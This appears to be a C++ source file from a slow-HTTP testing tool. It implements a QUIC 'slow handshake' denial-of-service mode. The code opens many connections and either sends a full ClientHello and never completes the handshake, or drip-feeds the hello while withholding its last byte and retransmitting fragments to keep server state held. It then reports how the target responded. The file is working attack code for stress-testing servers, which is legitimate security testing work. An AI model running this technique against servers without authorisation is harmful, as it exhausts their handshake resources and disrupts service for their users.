// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_quic.hpp"

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <random>

namespace slowhttp {
namespace {

// Connection IDs are how the server tells two connections apart, so they have
// to be unpredictable and distinct. Eight bytes is what common clients use.
constexpr std::size_t kConnIdLen = 8;

std::string random_id(std::size_t n) {
  static thread_local std::mt19937 rng{std::random_device{}()};
  std::uniform_int_distribution<int> byte(0, 255);
  std::string s;
  s.reserve(n);
  for (std::size_t i = 0; i < n; ++i)
    s.push_back(static_cast<char>(byte(rng)));
  return s;
}

// RFC 6066 3 forbids a literal address in SNI, and a server enforcing that
// rejects the hello before it ever waits.
bool host_is_literal_ip(const std::string& host) {
  if (host.empty()) return true;
  if (host.find(':') != std::string::npos) return true;
  for (char c : host)
    if (!std::isdigit(static_cast<unsigned char>(c)) && c != '.') return false;
  return true;
}

}  // namespace

SlowQuic::SlowQuic(const Config& cfg, Hello hello)
    : hello_mode_(hello),
      interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
      conns_(static_cast<std::size_t>(cfg.connections)) {
  sni_ = host_is_literal_ip(cfg.target.host) ? std::string() : cfg.target.host;
  chunk_ = std::max<std::size_t>(1, static_cast<std::size_t>(cfg.max_random_data_len));
  // Only for the startup line: every connection builds its own hello, since the
  // random and the key share must differ and the transport parameters carry
  // that connection's own source id.
  quic::HelloOptions probe;
  probe.host = sni_;
  probe.scid = std::string(kConnIdLen, '\0');
  hello_size_ = quic::client_hello(probe).size();
}

void SlowQuic::reset(ConnId id) {
  Conn& c = conns_[static_cast<std::size_t>(id)];
  c.dcid = random_id(kConnIdLen);
  c.scid = random_id(kConnIdLen);
  c.keys = quic::initial_keys(c.dcid, /*server=*/false);
  quic::HelloOptions opt;
  opt.host = sni_;
  opt.scid = c.scid;
  c.hello = quic::client_hello(opt);
  c.sent = 0;
  c.packet_number = 0;
  c.best_rank = 0;
}

void SlowQuic::on_open(ConnId id) {
  if (id < 0 || static_cast<std::size_t>(id) >= conns_.size()) return;
  reset(id);
}

std::string SlowQuic::build_packet(Conn& c, std::size_t offset,
                                   std::size_t len) {
  const std::string data = c.hello.substr(offset, len);
  std::string pkt = quic::initial_packet(c.dcid, c.scid, c.keys,
                                         c.packet_number++, offset, data);
  bytes_out_ += static_cast<long long>(pkt.size());
  return pkt;
}

Action SlowQuic::on_connect(ConnId id) {
  if (id < 0 || static_cast<std::size_t>(id) >= conns_.size())
    return Action::wait(interval_);
  ++started_;
  Conn& c = conns_[static_cast<std::size_t>(id)];
  // Complete: the whole hello in one go, and then nothing ever again -- the
  // server does its expensive half and waits for a Finished that never comes.
  // Partial: the first fragment only, so the hello can never be parsed.
  const std::size_t take =
      hello_mode_ == Hello::Complete ? c.hello.size()
                                     : std::min(chunk_, c.hello.size() - 1);
  std::string pkt = build_packet(c, 0, take);
  c.sent = take;
  return Action::send(pkt, interval_);
}

Action SlowQuic::on_timer(ConnId id) {
  if (id < 0 || static_cast<std::size_t>(id) >= conns_.size())
    return Action::wait(interval_);
  Conn& c = conns_[static_cast<std::size_t>(id)];

  if (hello_mode_ == Hello::Complete) {
    // Nothing more is ever sent. The hold is the server waiting on its own
    // timer, and anything sent here would only look like a client making
    // progress.
    return Action::wait(interval_);
  }

  // One byte of the hello is never delivered, so the handshake can never
  // complete no matter how long the run lasts.
  const std::size_t limit = c.hello.empty() ? 0 : c.hello.size() - 1;
  if (c.sent < limit) {
    const std::size_t take = std::min(chunk_, limit - c.sent);
    std::string pkt = build_packet(c, c.sent, take);
    c.sent += take;
    return Action::send(pkt, interval_);
  }

  // Out of fragments, but the connection still has to survive the server's idle
  // timer. Re-sending the last fragment is a retransmission -- what a client on
  // a lossy path does -- and it refreshes that timer without completing
  // anything.
  if (limit == 0) return Action::wait(interval_);
  const std::size_t take = std::min(chunk_, limit);
  std::string pkt = build_packet(c, limit - take, take);
  return Action::send(pkt, interval_);
}

Action SlowQuic::on_readable(ConnId id, const char* data, std::size_t len) {
  if (id < 0 || static_cast<std::size_t>(id) >= conns_.size())
    return Action::idle();
  bytes_in_ += static_cast<long long>(len);
  Conn& c = conns_[static_cast<std::size_t>(id)];
  const quic::Reply r = quic::classify(data, len);

  // A server answers an Initial with an Initial of its own carrying an ACK,
  // and only then, if the hello was complete, with its Handshake flight. Both
  // arrive on the same connection, so the verdict is the strongest one seen
  // rather than the first: an Initial alone means held, a Handshake means the
  // key exchange and the signature actually ran.
  int rank = 0;
  switch (r) {
    case quic::Reply::Initial:   rank = 1; break;
    case quic::Reply::Retry:     rank = 2; break;
    case quic::Reply::Handshake: rank = 3; break;
    default: return Action::idle();
  }
  if (rank <= c.best_rank) {
    // Already counted at this strength or better. A Retry still ends the
    // connection: the server created nothing and is waiting to be re-addressed.
    return r == quic::Reply::Retry ? Action::reconnect() : Action::idle();
  }

  // Move this connection out of the weaker bucket it was in, if any. There is
  // no case for rank 3: Handshake is the highest rank, so nothing can displace
  // a connection already counted there.
  switch (c.best_rank) {
    case 1: --held_; break;
    case 2: --retried_; break;
    default: break;
  }
  c.best_rank = rank;
  switch (rank) {
    case 1: ++held_; break;
    case 2: ++retried_; break;
    case 3: ++handshaked_; break;
    default: break;
  }
  // Retry means no connection state was created, so the slot is recycled
  // rather than spent holding something that does not exist.
  return r == quic::Reply::Retry ? Action::reconnect() : Action::idle();
}

std::string SlowQuic::status_note() const {
  // The engine's socket count cannot mean anything over UDP, so this is what
  // the run actually knows: how many of those sockets the target has answered,
  // and with what.
  if (started_ == 0) return std::string();
  char buf[160];
  std::snprintf(buf, sizeof(buf),
                "%ld held, %ld handshaking, %ld retried, of %ld opened",
                held_, handshaked_, retried_, started_);
  return std::string(buf);
}

std::string SlowQuic::verdict_caveat() const {
  // Retry means the server handed back a token and created nothing. If that is
  // what happened to every connection, no handshake state was ever held, so
  // whatever made the probe fail was not this attack exhausting it -- the far
  // likelier reading is that the target is shedding this source address.
  // Reporting "denied" without that distinction would credit the tool with an
  // outage it did not cause.
  if (started_ > 0 && retried_ > 0 && held_ == 0 && handshaked_ == 0) {
    return "Every connection was answered with Retry, so the target created no "
           "handshake state at all -- any denial seen here is far more likely "
           "this source address being shed than handshake resources being "
           "exhausted. Re-check from a different address before concluding "
           "anything about capacity.";
  }
  return std::string();
}

std::string SlowQuic::summary() const {
  if (started_ == 0) return std::string();
  char buf[512];
  const double amp =
      bytes_out_ > 0 ? static_cast<double>(bytes_in_) / static_cast<double>(bytes_out_)
                     : 0.0;
  if (retried_ > 0 && handshaked_ == 0 && held_ == 0) {
    // The designed defense (RFC 9000 8.1) and a clean result: nothing was held
    // because nothing was created.
    std::snprintf(buf, sizeof(buf),
                  "QUIC: every connection was answered with Retry -- the target"
                  " validates addresses before creating handshake state, which"
                  " is what this mode tests for");
  } else if (handshaked_ > 0) {
    // RFC 9000 8.1 caps what a server may send to an unvalidated address at
    // three times what it received, and this run never validates: no Handshake
    // packet is ever sent back. A ratio above three is therefore worth looking
    // at with a capture before it is reported as a finding -- the number here
    // is cumulative over the run, retransmissions included.
    std::snprintf(buf, sizeof(buf),
                  "QUIC: %ld connection(s) got a Handshake flight -- the target"
                  " ran the key exchange and signed for a handshake that was"
                  " never finished; %lld bytes sent, %lld received (%.1fx)%s",
                  handshaked_, bytes_out_, bytes_in_, amp,
                  amp > 3.0 ? ", above the 3x RFC 9000 8.1 allows before the"
                              " client's address is validated"
                            : "");
  } else if (held_ > 0) {
    std::snprintf(buf, sizeof(buf),
                  "QUIC: %ld connection(s) were accepted and held%s%s;"
                  " %lld bytes sent, %lld received",
                  held_,
                  hello_mode_ == Hello::Partial
                      ? " with a ClientHello the target cannot parse yet"
                      : " without the target completing its half",
                  retried_ > 0 ? " (some were sent a Retry)" : "",
                  bytes_out_, bytes_in_);
  } else {
    std::snprintf(buf, sizeof(buf),
                  "QUIC: the target never answered -- either nothing speaks"
                  " QUIC on that port, or UDP to it is filtered; %lld bytes"
                  " sent",
                  bytes_out_);
  }
  return std::string(buf);
}

}  // namespace slowhttp
